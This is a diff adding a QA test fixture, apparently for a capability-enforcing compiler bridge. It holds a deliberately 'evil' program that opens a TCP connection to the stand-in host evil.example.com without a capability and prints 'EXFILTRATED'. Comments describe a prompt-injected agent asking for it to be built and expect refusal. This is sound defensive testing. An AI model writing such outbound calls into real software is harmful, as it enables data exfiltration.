@@ -1,0 +1,22 @@
+// # E_CAP evil fixture — capless network exfiltration attempt (MCP copy)
+//
+// Logline: DEMO MALWARE SHAPE, same program as oodac/qa/fixture_ecap_evil.oo.
+// An injected agent asks the bridge to check/build this. Must be refused.
+//
+// Setup: Do not run, do not emit, do not build. Workspace-relative import
+// resolves from the workspace root like the other qa fixtures.
+//
+// Beats:
+//   1. Attempt TCP connect with the capability argument missing.
+
+import "std/net/net.oo";
+
+pub fn main() -> Int {
+    let r: Result[String, String] = net_tcp_connect("evil.example.com", 80);
+    if r.is_err() {
+        println("connect failed");
+        return 1;
+    }
+    println("EXFILTRATED");
+    return 0;
+}
